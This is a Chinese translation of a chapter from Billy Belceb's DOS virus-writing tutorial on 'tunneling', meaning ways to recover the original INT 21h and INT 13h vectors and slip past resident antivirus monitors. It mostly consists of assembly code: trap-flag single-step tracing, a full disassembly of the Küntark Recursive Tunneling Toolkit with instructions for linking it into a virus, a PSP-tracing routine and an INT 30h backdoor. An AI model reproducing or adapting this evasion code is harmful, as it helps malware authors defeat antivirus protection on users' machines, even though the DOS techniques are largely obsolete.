

# Billy Belceb 病毒编写教程(DOS 篇)---Tunneling 

> 原文：[`www.pediy.com/kssd/pediy06/pediy640610.htm`](https://www.pediy.com/kssd/pediy06/pediy640610.htm)

【Tunneling】   
\~~~~~~~~~~~   
    我们称 tunneling 为一类操作，这类操作获得任何中断的原始中断向量，这些中断是所有关于 INT 21h 的所有时间的中断。由此可见，并不是所有的操作都可以称作 tunneling(如，后门 backdoors)，但是我们也会在这篇文章里面讨论到。   
    Tunneling 是为避开 TSR 监视程序而开发的。这种类型的反病毒对普通使用者来说是不可理解的(什么话！)，因为他们被告知了钩住中断，打开可执行文件，和一个病毒通常会做的事情的企图。这种方法用上述的方法(反探索)确实很难对付了，因为它们不搜索一些比特，它们仅仅钩住和控制重要的中断(21h,13h...)   
    最普遍的 TSR 监视程序是 Flintstones 的 VSAFE,VSHIELD...我们的目标是获得原始的中断向量但是...怎么来实现呢？你有很多个选择。   
  
%跟踪%   
\~~~~~~   
    这可能是最常用的方法之一，但也是很不安全的方法。是的，这种类型的 tunneling 是非常脆弱的，而且如果你仔细地看看下面的论述，你会知道为什么是非常脆弱的:)   
    有一个标志，叫做陷阱标志 Trap Flag(通常缩写为 TF)，如果被激活，用来把处理器切换到单步执行模式。单步执行模式就是调试器用来一步一步的执行指令的，当然我们可以用来满足我们的需要啦:)   
    一个指令每执行一次，TF 就会被激活，INT 1 将会被调用，所以这次是我们的啦:)但是没有一个激活它的指令，所以我们必须对标志处理。让我们看看我们怎样激活 TF 的：   
  
  pushf        ; Push flags to stack   
  pop ax        ; And put them into AX for play   
  or ax, 100h      ; We activate the TF at this point   
  push ax       ; We must push AX...   
  popf        ; for restore our preety flags :)   
  
    利用这些简单的代码，你已经激活了陷阱标志。我忘了给出所有标志了，下面给出：   
  
 Position   0F 0E 0D 0C 0B 0A 09 08 07 06 05 04 03 02 01 00   
                         
 Flags      -- -- -- -- OF DF IF TF SF ZF -- AF -- PF -- CF   
  
    正如你所看到的，这些标志是在一个 16 位的寄存器里面。下面给出标志列表及所代表的意义：   
  
 CF : Carry Flag      Indicates an arithmetic carry   
 PF : Parity Flag     Indicates an even number of 1 bits   
 AF : Auxilary Flag   Indicates adjustment needed in BCD numbers   
 ZF : Zero Flag       Indicates a zero result, or equal comparison   
 SF : Sign Flag       Indicates negative result/comparison   
 TF : Trap Flag       Controls Single Step operation   
 IF : Interrupt Flag  Controls whether interrupts are enabled   
 DF : Direction Flag  Controls increment direction on string regs.   
 OF : Overflow Flag   Indicates signed arithmetic overflow   
  
    让我们记住关于中断的一些东西。每次我们调用一个中断，在堆栈里是 6 个字节：标志和 CS:IP。你必须记住这一点，因为我们必须要调用 INT 21h，然后跟踪它的代码。如果调用之后 CS(在堆栈中)等于当我们请求的中断向量 DOS 已经给我们的值，那么这个中断就是正常的中断。实现 tunneling 的简单的例程如下：   
  
 int01handler:   
  push bp   
  mov bp, sp   
  push dx   
  mov dx, word ptr cs:\[dossegment\]   
  cmp \[bp+6\], dx   
  jz found   
  pop dx   
  pop bp   
  iret   
 found:   
  mov dx, \[bp+6\]   
  mov word ptr cs:\[int21\_seg\], dx   
  mov dx, \[bp+4\]   
  mov word ptr cs:\[int21\_off\], dx   
  pop dx   
  pop bp   
  add sp, 6   
  \[...\]   
  
    但是这种类型的 tunneling，正如我在开始解释的时候所说的，有很多弱点。我们不保护 POPF,PUSHF,CLI 和 TF 的释放，因为我们要真正地执行这个代码。   
    如果病毒查杀工具重定向 INT 21h 给另外一个中断，我们又要受挫了。正如你能看到地，这个跟踪不安全。   
    好了，我们可以通过检查一些代码来解决一些问题，如 PUSHF 和 POF，为了不使蹩脚者释放 TF。无论如何，跟踪不是最好的选择...   
  
%字节到字节(byte-to-byte)%   
\~~~~~~~~~~~~~~~~~~~~~~~~   
    最流行(仅有的一个)的源程序是 K 攈 ntark Recursive Tunneling Toolkit ( 即 KRTT )。它使用的方法是对中断处理程序中的所有操作码做比较，为了判断它是否为 CALL，CALL FAR，JUMP FAR，和 JUMP OFF:SEG，然后获得这个值作为 INT 21h。让我们看看 KRTT41 包中的 KRTT41.OBJ 这个文件的彻底反汇编，它是这个工具的核心。   
  
;----从这里开始剪切-------------------------------------------------------   
; K 攈 ntark Recursive Tunneling Toolkit 4.1 (c) 1993 by K 攈 ntarK   
; 反汇编 Billy Belceb?DDT   
;   
; 输入:   
;   BP : 01        Searches for INT 2Ah handler   
;   BP : 02        Searches for INT 13h handler   
;   BP : another value  Searches for INT 21h handler   
; 输出:   
;   AH : 00        Not found   
;   AH : 01        Found!   
;   AH : 02        Int 21h / 2Ah / 13h  Not Hooked   
;   AH : 03        DOS internal interrupts are hooked   
; 如果找到:   
;   DX          DOS INT 21h / 2Ah / 13h SEGMENT   
;   DI          INT 21h  / 2Ah / 13h OFFSET   
;   AL          RECURSION DEPT   
; DESTROYED:   
;   AX,BX,CX,DX,DI,BP,ES   
;   
; 汇编:   
;  TASM KRTT41.ASM   
;  TLINK <virus name> KRTT41.OBJ   
;   
; Call TUNNEL for make tunneling   
;   
; 声明: 这是我第一次试着反汇编一些东西,所以如果有大的错误，原谅我:)   
; 这不是我的工作...   
  
       .model  tiny   
       .code   
  public  tunnel   
  
tunnel:   
  cli        ; Disable interrupts for tunneling   
  xor  ax,ax   
  mov  es,ax      ; Make ES = 0 for get IVT   
  xor  di,di   
  mov  dx,es:\[00AEh\]    ; Checks for assure tunneling   
  mov  cx,es:\[00A2h\]    ; INT 26h =! INT 28h   
  cmp  dx,cx   
  jz  check   
  mov  cx,es:\[00B2h\]    ; INT 26h =! INT 28h =! INT 2Ch   
  cmp  dx,cx   
  jz  check   
  mov  ah,03      ; Checks failed : DOS ints are hooked   
  ret   
check:   
  cmp  bp,01h      ; BP=1       Hook INT 2Ah   
  jz  int2A   
  cmp  bp,02h      ; BP=2       Hook INT 13h   
  jz  int13   
int21:   
  mov  bx,es:\[0084h\]    ; BP=Other   Hook INT 21h   
  mov  es,es:\[0086h\]   
  jmp  go4it   
int13:   
  mov  bx,es:\[004Ch\]    ; Get INT 13h vectors from the IVT to   
  mov  es,es:\[004Eh\]    ; ES:BX   
  mov  bp,es   
  mov  dx,0070h   
  cmp  bp,dx   
  jz  nothooked   
  jmp  letstunnelit   
int2A:   
  mov  bx,es:\[00A8h\]    ; Get INT 13h vectors from the IVT to   
  mov  es,es:\[00AAh\]    ; ES:BX   
go4it:   
  mov  bp,es   
  cmp  dx,bp   
  jnz  letstunnelit   
nothooked:   
  xchg  bx,di   
  mov  ah,02h      ; INT not hooked \*yeah\* ;)   
  ret   
letstunnelit:   
  call  main\_body    ; Go and tunnel it   
  sti   
  ret   
main\_body:   
  push  es   
  push  bx   
  cmp  al,07h      ; Check for recursion   
  jz  exit   
  cmp  ah,01h      ; Found ?   
  jz  exit   
  inc  al   
  mov  cx,0FFFAh   
  sub  cx,bx   
main\_loop:   
  push  bx   
  cmp  byte ptr es:\[bx\],0E8h  ; Is OpCode a CALL ?   
  jz  callsig16   
  cmp  byte ptr es:\[bx\],0EAh  ; Is it a JUMP OFFSET:SEGMENT ?   
  jz  far\_stuff   
  cmp  byte ptr es:\[bx\],09Ah  ; Is it a CALL FAR ?   
  jz  far\_stuff   
  cmp  byte ptr es:\[bx\],02Eh  ; A Segment Override CS maybe ? :P   
  jnz  jmpfar   
  cmp  byte ptr es:\[bx+01\],0FFh ; A JUMP FAR ?   
  jnz  jmpfar   
  cmp  byte ptr es:\[bx+02\],01Eh ; PUSH DS ?   
  jz  far\_stuff2   
  cmp  byte ptr es:\[bx+02\],02Eh ; CS ? ( again )   
  jnz  jmpfar   
far\_stuff2:   
  mov  bp,es:\[bx+03\]   
  dec  bp   
  xchg  bx,bp   
  jmp  far\_stuff   
jmpfar:   
  pop  bx   
  cmp  ah,01h      ; Found ?   
  jz  exit   
  cmp  al,07h      ; Check for recursion   
  jz  exit   
  inc  bx   
  loop  main\_loop    ; And loop it   
callsig16:   
  pop  bx   
  add  bx,03h   
  loop  main\_loop   
exit:   
  pop  bx   
  pop  es   
  ret   
far\_stuff:   
  pop  bp   
  add  bp,04h   
  push  bp   
  cmp  es:\[bx+03\],dx   
  jz  found   
  cmp  word ptr es:\[bx+03\],00h   
  jz  jmpfar   
  push  es   
  pop  bp   
  cmp  es:\[bx+03\],bp   
  jz  jmpfar   
  mov  bp,bx   
  mov  bx,es:\[bx+01\]    ; Where it points   
  mov  es,es:\[bp+03\]   
  call  main\_body   
  jmp  jmpfar   
found:   
  mov  di,es:\[bx+01\]   
  mov  ah,01      ; INT 21 found   
  jmp  jmpfar   
end  tunnel   
  
;----到这里结束------------------------------------------------------------   
  
    如果你想要完全的包，可以搜索，它很容易找到的，但是 KRTT 不是很安全。也许你很恼怒。Tunneling 看起来是一项非常不安全和脆弱的技术。这只是在这些老技术里才会发生。如果控制权是由另外一个不是我们的程序的指令返回的时候，KRTT 就会受挫了。利用一个条件 jump 或者 RETF 很容易调用 INT 21h，这对我们不好。而且这个必定是递归的，显而易见。   
  
%PSP 跟踪%   
\~~~~~~~~~   
    如果你还记得那个非常重要的结构 PSP，并看过了关于 offset 0005 的描述，你将会想..."利用 FAR CALL 来调用 INT 21 该是多痛苦啊！"PSP 的这个 offset 已经相当过时了，它只是为了对非常老的程序兼容而保留的。但是它包含了非常有趣的数据，如 INT 21h 指派。INT 21h 指派不是 INT 21h 处理程序，不要忘记这一点。正如 Satan 的 Little Helper 所说的，offset PSP:6 能直接指向调度，或者不直接指向，这需要一些对第一种情况的双 nop 调用处理。   
    下面的例程来自 VLAD#3(很强的一个组织！)，Satan's Little Helper 写的文章，介绍了利用 PSP 来获得 INT 21h 地址的方法。   
  
;-----从这里开始剪切-------------------------------------------------------   
; PSP tracing routine by Satan's Little Helper   
; Published in VLAD#3   
;   
; INPUT:   
;   DS          PSP segment   
; OUTPUT:   
;   DS:BX         INT 21h address   
;   CF          0   
; if tunnel failed:   
;   DS:BX         0000:0000   
;   CF          1   
  
psp\_trace:   
  lds  bx,ds:\[0006h\]    ; a pointer to dispatch handler   
trace\_next:   
  cmp  byte ptr ds:\[bx\],0EAh  ; JMP SEG:OFF ?   
  jnz  check\_dispatch   
  lds  bx,ds:\[bx+1\]    ; point to the SEGMENT:OFFSET   
  cmp  word ptr ds:\[bx\],9090h   
  jnz  trace\_next   
  sub  bx,32h      ; 32h byte offset from dispatch   
          ; handler   
  cmp  word ptr ds:\[bx\],9090h  ; If all is OK, INT 21h has this   
  jnz  check\_dispatch    ; signature ( 2 NOPs )   
good\_search:   
  clc   
  ret   
check\_dispatch:   
  cmp  word ptr ds:\[bx\],2E1Eh  ; PUSH DS, CS: ( prefix )   
  jnz  bad\_exit   
  add  bx,25h   
  cmp  word ptr ds:\[bx\],80FAh  ; CLI, PUSH AX   
  jz  good\_search   
bad\_exit:   
  stc   
  ret   
;-----到这里为止剪切-------------------------------------------------------   
  
    相当简单而有效。试试看！而且，利用 PSP 跟踪的框架，我们可以使用另外一个方法，INT 30h 的后门。   
    PSP 跟踪比普通跟踪更好，因为在第二个里面我们不知道我们是否正在执行一个病毒查杀工具的代码，而使用 PSP 就不会发生了。   
  
%INT 30h 后门%   
\~~~~~~~~~~~~~~   
    如果你看懂了上面的技术，这就非常简单了。INT 30h 有跳转到调度的代码，所以我们可以如下写代码：   
  
  xor  bx,bx   
  mov  ds,bx   
  mov  bl,0C0h     ; INT 30h offset in IVT   
  jmp  trace\_next   
  
    记住当在 Windows 环境下，INT 30h 用来实现另外一个目的，一定要注意，但是那又是另一段历史了:)   
  
%代码仿真(Code Emulators)%   
\~~~~~~~~~~   
    我现在还能记住的第一篇文章是 Methyl\[IR/G\]以前写的一篇文章，发表在 IR#8(IRG#1?)。这个小教程不象 Methyl 的，我没有太多的空间(这篇教程正越来越大)，所以这篇教程是 100%理论的。但是，不要放弃，它很容易理解。对我来说，仿真看起来是对老的 byte-to-byte 扫描的改进，但更先进和安全了。我不是说它们完全等价。byte-to-byte 扫描仅仅对操作码作比较，而仿真就象指令执行的时候那样做的事情：仿真遵循原程序的流程，有假的跳转，函数调用...用这种方法，它所有可能的 INT 21h 跳转，这是我们所需要的。OK，这个是概念。如果你想知道更多的东西，我建议你下载 IR#8，看看 Methyl 的教程。那是个很好的杂志，所以祝你好运！   
  
%高级 tunneling%   
\~~~~~~~~~~~~~~~   
    啊...还是那句话：我不想使你的头脑因为太多的知识而爆炸。现在有更安全、更酷、更新...的技术，但是它们都太难了，而且在这篇文章里介绍它们的实现将在你的硬盘上占用太多的空间:) 

 4dd466d0e1e0cc123afbe504da2462ca